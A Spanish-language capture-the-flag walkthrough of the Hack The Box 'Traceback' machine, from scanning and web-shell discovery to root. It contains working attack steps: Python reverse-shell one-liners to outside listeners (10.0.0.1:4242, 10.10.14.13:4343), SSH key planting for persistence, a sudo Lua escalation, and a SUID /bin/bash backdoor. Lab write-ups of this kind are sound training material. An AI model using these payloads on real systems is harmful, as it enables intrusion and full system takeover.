# TRACEBACK MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/1.PNG)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 - v -n 10.10.10.181 -oG allPorts
```

La salida nos muesta el puerto 22 y 80 abiertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/2.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```
nmap -p22,5000 -sV -sC 10.10.10.181 -oN targeted
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/3.PNG)

vamos a revisar la pagina:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/4.PNG)

tiene un mensaje de que alguien dejo un backdoor, vamos a revisar el codigo fuente:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/5.PNG)

vemos un mensaje comentado: **Some of the best web shells that you might need**

si buscamos en google y vamos al primer enlace nos lleva a un repositorio de github:

[https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells)

vemos que son varias webshell, vamos a armar un diccionario con las webshells en PHP (ya que el servidor tiene un apache y al parecer interpreta PHP) y con ese diccionario vamos a fuzzear:

```bash
wfuzz -c --hw=195 --hc=404 -w dict.txt  http://10.10.10.181/FUZZ
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/6.PNG)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/7.PNG)

vemos que encontro la ruta **smevk.php** vamos a ver que hay ahi:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/8.PNG)

es un simple inicio de sesion, vamos a poner credenciales por defecto como **admin:admin** y vemos como ingresamos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/9.PNG)

si vamos al apartado de **console** vemos que se ejecutan comandos del sistema:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/10.PNG)

## EXPLOTACION

si interceptamos con burpsuite vemos como se envia el comando:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/11.PNG)

si modificamos el comando y nos spawneamos un reverse shell con python3 o bash y lo reenviamos por el repiter vemos que nos conectamos:

```bash
python3+-c+'import+socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'+&
```

ponemos al final **&** para que se ejecute esa tarea en segundo plano:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/12.PNG)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/13.PNG)

si vamos a la ruta **/home/webadmin** vemos la carpeta **.ssh** con un archivo **authorized_keys**, vamos a generar un par de claves ssh para poder ingresar por SSH con esa llave:

```bash
ssh-keygen
```

esto creara un par de claves **id_rsa y id_rsa.pub**

la llave **id_rsa** nos la pasamos a nuestro equipo por un servidor con python y le damos el sigueinte permiso:

```bash
chmod 600 id_rsa
```

la llave publuca **id_rsa.pub** su contenido la colocamos en authorized_keys:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/14.PNG)

y nos conectamos con la id_rsa:

```bash
ssh -i id_rsa webadmin@10.10.10.181
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/15.PNG)

## ELEVACION DE PRIVILEGIOS

si hacemos:

```bash
sudo -l
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/16.PNG)

podemos ejecutar como sudo a traves del usuario sysadmin un script

ademas vemos que sysadmin dejo una nota en **/home/webadmin/notes.txt**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/17.PNG)

entonces vamos a buscar que es **luvit** en google y tenemos el sigueinte resulta del primere enlace:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/18.PNG)

y podemos ejecutar scripts en lua:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/19.PNG)

ademas se tiene contenido en el archivo bash_history:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/20.PNG)

asi que vamos a poner el siguiente contenido en un archivo llamado **privesc.lua**:

```bash
require('os');os.execute("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",4343));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' &")

```

ya sabemos como ejecutar gracias al bash history:

```bash
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
```

nos colocamos a la escucha y tenemos una conexion como sysadmin:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/21.PNG)

y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/22.PNG)

ahora vamos a pasarnos el pypy64 para ver tareas cron que se esten ejecutando, lo ejecutamos dandole permisos de ejecucion primero:

```bash
chmod +x pspy64
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/23.PNG)

vemos que se ejecuta al cada 30 segundos (sleep 30) en la ruta **/etc/update-motd.d**, si vamos a esa ruta vemos los sigueintes archivos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/24.PNG)

vemos que tenemos permisos de escritura, vamos a ver el archivo **00-header**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/25.PNG)

es un script en bash y su contenido se parece a lo que sale en el banner cuando nos conectamos por ssh:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/26.PNG)

como el que lo ejecuta es root podemos agregar permisos suid para la **/bin/bash**

```bash
chmod 4755 /bin/bash
```

y vamos intentar conectarnos por ssh para que salga el banner y ejecute lo que colocamos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/26.PNG)

si vemos los permisos de **/bin/bash**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/27.PNG)

ahora es cuestion de hacer:

```bash
/bin/bash -p
```

y ya somos root y podemos ver la flag;

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/TRACEBACK/images/28.PNG)
